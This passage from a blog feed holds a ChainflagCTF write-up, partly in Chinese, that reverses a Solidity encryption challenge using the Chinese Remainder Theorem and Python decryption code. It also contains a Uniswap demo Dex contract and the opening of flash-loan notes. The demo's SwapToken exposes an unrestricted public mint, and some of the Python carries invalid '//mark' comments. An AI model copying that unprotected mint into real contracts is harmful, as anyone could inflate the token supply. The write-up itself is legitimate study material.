class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function set_key(string memory tmp) public &#123;</span><br><span class="line">    key = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>we only know the msg.sender call the <code>set_key()</code>, but he hides the parameter.</p><p>2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000003100e35e552c1273c959</span><br><span class="line">sload(0) = 208645382789328542577309</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000001ac3243c9e81ba850045</span><br><span class="line">sload(0) = 29341064342757093333104</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line">0xffdd8131000000000000000000000000000000000000000000005ce6a91010e307946b87</span><br><span class="line">sload(0) = 227103917449451505785192</span><br></pre></td></tr></table></figure><p>The 2.3.4 of the info.txt is the result of <code>keccak256(&quot;cal_(uint256)&quot;);</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function cal_(uint x) public &#123;</span><br><span class="line">    uint tmp = Convert(key) / 0x10000000000000000;</span><br><span class="line">    result = tmp % x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sload(0) returns the content of slot(0), it is <code>result</code> in this contract. </p><p>3.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5.</span><br><span class="line">0xe6dc28ae..................</span><br><span class="line">sload(3) = 1970527074032043059410457910532573615730510348629701619382</span><br></pre></td></tr></table></figure><p><code>0xe6dc28ae</code> is the result of <code>keccak256(&quot;Encrypt(string)&quot;)</code>. sload(3) returns the content of slot(3), it is <code>output</code> in this contract. </p><p>4.</p><p>Now we know what happened in the info.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">transaction</span><br><span class="line">1.set_key(string memory tmp)</span><br><span class="line">2.cal_(uint 0x3100e35e552c1273c959)</span><br><span class="line">  result = 0x2c2eb0597447608b329d</span><br><span class="line">3.cal_(uint 0x1ac3243c9e81ba850045)</span><br><span class="line">  result = 0x6369510a41dbcbed870</span><br><span class="line">4.cal_(uint 0x5ce6a91010e307946b87)</span><br><span class="line">  result = 0x301753fa0827117d1968</span><br><span class="line">5.Encrypt(string memory flag)</span><br><span class="line">output =0x505d433947f27742f60b06f350f2583450a1f7221380eeb6</span><br></pre></td></tr></table></figure><p>This level is an encryption and decryption question constructed using Solidity language. The question sets an unknown key value and then calls  <code>cal_</code> three times. In the end, we need to get the parameter of Encrypt by the output.</p><p>5.</p><p>The <code>cal_</code> can be understood as taking remainder:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x2c2eb0597447608b329d = tmp % 0x3100e35e552c1273c959</span><br><span class="line">0x6369510a41dbcbed870 = tmp % 0x1ac3243c9e81ba850045</span><br><span class="line">0x301753fa0827117d1968 = tmp % 0x5ce6a91010e307946b87</span><br></pre></td></tr></table></figure><p>We can infer <code>tmp</code> by “中国剩余定律”, the result is: tmp=0x6b65795f746869735f69735f6b65795f</p><p>6.</p><p>Let’s analyses <code>Encrypt()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint tmp = Convert(flag);</span><br><span class="line">uint key_tmp = Convert(key) / 0x10000000000000000;</span><br><span class="line">assembly &#123;</span><br><span class="line">    let first,second</span><br><span class="line">    sstore(5, and(shr(96, key_tmp), 0xffffffff))</span><br><span class="line">    sstore(6, and(shr(64, key_tmp), 0xffffffff))</span><br><span class="line">    sstore(7, and(shr(32, key_tmp), 0xffffffff))</span><br><span class="line">    sstore(8, and(key_tmp, 0xffffffff))</span><br></pre></td></tr></table></figure><ul><li><code>uint key_tmp = Convert(key) / 0x10000000000000000;</code>: this is the value of tmp we calculate before: 0x6b65795f746869735f69735f6b65795f</li><li><code>sstore(5, and(shr(96, key_tmp), 0xffffffff))</code>: storage[5] := v, it equal to that:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v = (0x6b65795f746869735f69735f6b65795f &gt;&gt; 96) &amp; 0xffffffff</span><br></pre></td></tr></table></figure><p>sstore 6,7,8 is the same theory as sstore 5, in the end, we get:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tmp = flag  #Convert(flag)  48 hex</span><br><span class="line">key_tmp =0x6b65795f746869735f69735f6b65795f</span><br><span class="line">sstore5 = 0x6b65795f</span><br><span class="line">sstore6 = 0x74686973</span><br><span class="line">sstore7 = 0x5f69735f</span><br><span class="line">sstore8 = 0x6b65795f</span><br><span class="line">sstore2 = 0xb3c6ef3720 #delta = 0xb3c6ef3720;</span><br><span class="line">sstore3 = 0 # not initalize</span><br></pre></td></tr></table></figure><p>7.</p><p>之前所求的tmp就是这里的key_tmp,那么存储在storage[5]到storage[8]都是固定值可以直接求出。后续部分用到的sload(2)是取storage[2]的值，按照源码分析对应的是变量delta=0xb3c6ef3720。storage[3]对应的output用来存储结果，由循环部分每次循环计算的结果移位拼接而成。将Encrypt函数重写成python，转化过程中需要注意符号的优先级，结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">tmp = flag  <span class="comment">#Convert(flag)  48 hex</span></span><br><span class="line">key_tmp =<span class="number">0x6b65795f746869735f69735f6b65795f</span></span><br><span class="line">sstore5 = <span class="number">0x6b65795f</span> <span class="comment"># 0x6b65795f 74686973 5f69735f 6b65795f &gt;&gt;96</span></span><br><span class="line">sstore6 = <span class="number">0x74686973</span></span><br><span class="line">sstore7 = <span class="number">0x5f69735f</span></span><br><span class="line">sstore8 = <span class="number">0x6b65795f</span></span><br><span class="line">sstore2 = <span class="number">0xb3c6ef3720</span></span><br><span class="line">sstore3 = <span class="number">0</span></span><br><span class="line">step = <span class="number">1</span></span><br><span class="line">sstore4listall = []//mark</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">    first = (tmp &gt;&gt; ((<span class="number">24</span> - i * <span class="number">8</span>)+<span class="number">4</span>) * <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    second = (tmp &gt;&gt; (<span class="number">24</span> - i * <span class="number">8</span>) * <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    sstore4 = <span class="number">0</span></span><br><span class="line">    sstore4list = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        sstore4 = ((sstore4 &amp; <span class="number">0xffffffff</span>) + (sstore2 &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        sstore4list.append(sstore4)//mark</span><br><span class="line">        tmp11 = (((second * <span class="number">16</span>) &amp; <span class="number">0xffffffff</span>) + sstore5 ) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp12 = (second + sstore4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp13 = ((second &gt;&gt; <span class="number">5</span>) + sstore6) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        first = (first + (tmp11 ^ tmp12 ^ tmp13)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp21 = (((first &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xffffffff</span>) + sstore7) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp22 = (first + sstore4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp23 = ((first &gt;&gt; <span class="number">5</span>) + sstore8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        second = (second + (tmp21 ^ tmp22 ^ tmp23)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    sstore4listall.append(sstore4list)//mark</span><br><span class="line">    sstore3 = sstore3 + ((first &lt;&lt; (<span class="number">192</span> - (step * <span class="number">32</span>))) + (second &lt;&lt; (<span class="number">192</span> - (i * <span class="number">64</span>))))</span><br><span class="line">    step = step + <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sstore3))</span><br><span class="line"><span class="comment">#sstore3 = 0x505d433947f27742f60b06f350f2583450a1f7221380eeb6</span></span><br></pre></td></tr></table></figure><p>8.</p><p>由以上这段加密过程求解flag，下面分析加密算法。算法主体是两层循环，第一层循环了3次，tmp为24字节，第一次循环求出的first和second是tmp的高位的0-4字节以及5-8字节，后续循环每次取8字节前部分为first变量，后部分为second变量。通过第二层循环后将first与second再度拼接组合，循环三次后为最终的输出。</p><p>第二层循环32次，其中的sstore4为storage[4]的存储值，初始为0并且随着循环不断变化，但是在3*32次的循环中与输入的flag无关，这96个数值是固定的，这里我设立了一个数组sstore4list用来存储记录，方便后续的解密。第二层的循环中的tmp11，tmp12，tmp13三个变量仅与second有关，first依据这三个值变化，tmp21，tmp22，tmp23三个变量仅与first有关，second依据这三个值变化，循环32次后为最后得到后续拼接的first与second。</p><p>依据主要逻辑可以理解为以下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tmp = [a,b,c]</span><br><span class="line">output =[]</span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    first = tmp[i][:<span class="number">16</span>]</span><br><span class="line">    second = tmp[i][<span class="number">17</span>:]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        tmp1 = unknow_1(second,sstore4[t])</span><br><span class="line">        first = (first + tmp1)&amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp2 = unknow_2(first,sstore4[t])</span><br><span class="line">        second = (second + tmp2)&amp; <span class="number">0xffffffff</span></span><br><span class="line">        t = t+<span class="number">1</span></span><br><span class="line">    output.append([first,second])</span><br></pre></td></tr></table></figure><p>9.</p><p>现在逻辑就清晰多了，先分组后加密在组合，类似于常见流密码的加密方式，对以上加密过程解密的逻辑可以理解为以下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tmp = []</span><br><span class="line">output =[a,b,c]</span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    first = output[i][:<span class="number">16</span>]</span><br><span class="line">    second = output[i][<span class="number">17</span>:]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        tmp1 = unknow_1(second,sstore4[t])</span><br><span class="line">        first = (first - tmp1)&amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp2 = unknow_2(first,sstore4[t])</span><br><span class="line">        second = (second - tmp2)&amp; <span class="number">0xffffffff</span></span><br><span class="line">        t = t+<span class="number">1</span></span><br><span class="line">    tmp.append([first,second])</span><br></pre></td></tr></table></figure><p>总结：获取slot3的数值output，它是调用<code>Encrypt()</code>的结果，我们需要做的是根据这个结果来反推它的输入key。那么，我们就要理解加密干了些什么，然后根据加密方式，倒推出解密方式，从而获得key值</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p><strong>中国剩余定理求解key_tmp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Numbertheory</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    本模块用于数论中出现的问题。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">moudle, a</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        中国剩余定律/孙子定律</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            moudle: 模列表</span></span><br><span class="line"><span class="string">            a: 同余值列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">            中国剩余定律结果</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        例子：</span></span><br><span class="line"><span class="string">            moudle = [3, 5, 7]</span></span><br><span class="line"><span class="string">            a = [2, 4, 3]</span></span><br><span class="line"><span class="string">            结果：59</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        M = reduce((<span class="keyword">lambda</span> x, y : x * y), moudle)</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> mi <span class="keyword">in</span> moudle:</span><br><span class="line">            Mi = M // mi</span><br><span class="line">            inv_Mi = gmpy2.invert(Mi, mi)</span><br><span class="line">            result = (result + a[moudle.index(mi)] * Mi * inv_Mi) % M</span><br><span class="line">        <span class="keyword">return</span> result % M</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">moudle = [<span class="number">0x3100e35e552c1273c959</span>, <span class="number">0x1ac3243c9e81ba850045</span>, <span class="number">0x5ce6a91010e307946b87</span>]</span><br><span class="line">a = [<span class="number">0x2c2eb0597447608b329d</span>, <span class="number">0x6369510a41dbcbed870</span>, <span class="number">0x301753fa0827117d1968</span>]</span><br><span class="line"><span class="built_in">print</span>(Numbertheory.CRT(moudle,a))</span><br></pre></td></tr></table></figure><p><strong>解密代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sstore3 = <span class="number">0x505d433947f27742f60b06f350f2583450a1f7221380eeb6</span></span><br><span class="line">key_tmp =<span class="number">0x6b65795f746869735f69735f6b65795f</span></span><br><span class="line">sstore5 = <span class="number">0x6b65795f</span></span><br><span class="line">sstore6 = <span class="number">0x74686973</span></span><br><span class="line">sstore7 = <span class="number">0x5f69735f</span></span><br><span class="line">sstore8 = <span class="number">0x6b65795f</span></span><br><span class="line">sstore2 = <span class="number">0xb3c6ef3720</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">step = <span class="number">1</span></span><br><span class="line">sstore4listall = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">    sstore4 = <span class="number">0</span></span><br><span class="line">    sstore4list = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        sstore4 = ((sstore4 &amp; <span class="number">0xffffffff</span>) + (sstore2 &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        sstore4list.append(sstore4)</span><br><span class="line">    sstore4listall.append(sstore4list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">    first = (sstore3 &gt;&gt; ((<span class="number">24</span> - i * <span class="number">8</span>)+<span class="number">4</span>) * <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    second = (sstore3 &gt;&gt; (<span class="number">24</span> - i * <span class="number">8</span>) * <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    sstore4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        sstore4 = sstore4list[<span class="number">31</span> - j]</span><br><span class="line">        tmp21 = (((first &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xffffffff</span>) + sstore7) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp22 = (first + sstore4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp23 = ((first &gt;&gt; <span class="number">5</span> )+ sstore8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        second = (second - (tmp21 ^ tmp22 ^ tmp23)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp11 = (((second &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xffffffff</span>) + sstore5) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp12 = (second + sstore4) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        tmp13 = ((second &gt;&gt; <span class="number">5</span>) + sstore6) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        first = (first - (tmp11 ^ tmp12 ^ tmp13)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    tmp = tmp + ((first &lt;&lt; (<span class="number">192</span> - (step * <span class="number">32</span>))) + (second &lt;&lt; (<span class="number">192</span> - (i * <span class="number">64</span>))))</span><br><span class="line">    step = step + <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tmp))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.uniswap quick start demo</title>
      <link href="/2024/04/14/03.Uniswap/07.uniswap%20quick%20start%20demo/"/>
      <url>/2024/04/14/03.Uniswap/07.uniswap%20quick%20start%20demo/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-quick-start-demo"><a href="#uniswap-quick-start-demo" class="headerlink" title="uniswap quick start demo"></a>uniswap quick start demo</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex &#123;</span><br><span class="line"> </span><br><span class="line">  using SafeERC20 for IERC20;</span><br><span class="line">  address public apple;</span><br><span class="line">  address public orange;</span><br><span class="line"></span><br><span class="line">  constructor(address _apple, address _orange)  &#123;</span><br><span class="line">    apple = _apple;</span><br><span class="line">    orange = _orange;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function swap(address sell, address buy, uint amountSell) public &#123;</span><br><span class="line"></span><br><span class="line">    require((sell == apple &amp;&amp; buy == orange) || (sell == orange &amp;&amp; buy == apple), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(sell).balanceOf(msg.sender) &gt;= amountSell, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint buyAmount = getAmountWithBuy(sell, buy, amountSell);</span><br><span class="line">    IERC20(sell).safeTransferFrom(msg.sender, address(this), amountSell);</span><br><span class="line">    IERC20(buy).safeTransfer(msg.sender, buyAmount);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function addLiquidity(address [] memory tokens, uint [] memory amounts) public&#123;</span><br><span class="line">    IERC20(tokens[0]).safeTransferFrom(msg.sender, address(this), amounts[0]);</span><br><span class="line">    IERC20(tokens[1]).safeTransferFrom(msg.sender, address(this), amounts[1]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getAmountWithBuy(address sell, address buy, uint sellAmount) public view returns(uint)&#123;</span><br><span class="line">      uint sellReserveAmount = IERC20(sell).balanceOf(address(this));</span><br><span class="line">      uint buyReserveAmount = IERC20(buy).balanceOf(address(this));</span><br><span class="line">      // 根据公式写的</span><br><span class="line">      return  (sellAmount * buyReserveAmount) / (sellReserveAmount + sellAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getLiquidity() public view returns(uint appleAmount, uint orangeAmount)&#123;</span><br><span class="line">     appleAmount = IERC20(apple).balanceOf(address(this));</span><br><span class="line">     orangeAmount = IERC20(orange).balanceOf(address(this));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getK() public view returns (uint) &#123;</span><br><span class="line">      (uint appleAmount, uint orangeAmount) = getLiquidity();</span><br><span class="line">      return appleAmount * orangeAmount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SwapToken is ERC20 &#123;</span><br><span class="line">    constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply * 10 ** decimals());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.uniswap_v2_flashloan</title>
      <link href="/2024/04/14/03.Uniswap/06.uniswap_v2_flashloan/"/>
      <url>/2024/04/14/03.Uniswap/06.uniswap_v2_flashloan/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v2-flashloan"><a href="#uniswap-v2-flashloan" class="headerlink" title="uniswap_v2_flashloan"></a>uniswap_v2_flashloan</h1><p>swap的两个参数，必须其中一个是0，另外一个大于0吗？</p><ul><li><p>直接调swap应该是两种都能借，使用router换代币肯定有一个是0，直接调swap没这个限制，只要满足k想怎么搞都行，这些都是router合约逻辑</p></li><li><p>闪电贷中，需要额外返还0.3%的手续费吗？那么我借了1000个，那么我返还的时候，就要返还1003个。少了就会revert，但是多了应该不会吧，多了应该属于捐赠了，这样也会影响到K值。满足k就行</p></li><li><p>ExampleFlashSwap.sol</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line"></span><br><span class="line">import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&#x27;;</span><br><span class="line">import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&#x27;;</span><br><span class="line">import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;</span><br><span class="line">import &#x27;./interfaces/IERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract ExampleFlashSwap is IUniswapV2Callee &#123;</span><br><span class="line"></span><br><span class="line">    //以下变量修改你部署合约地址 </span><br><span class="line">    address private constant WETH = 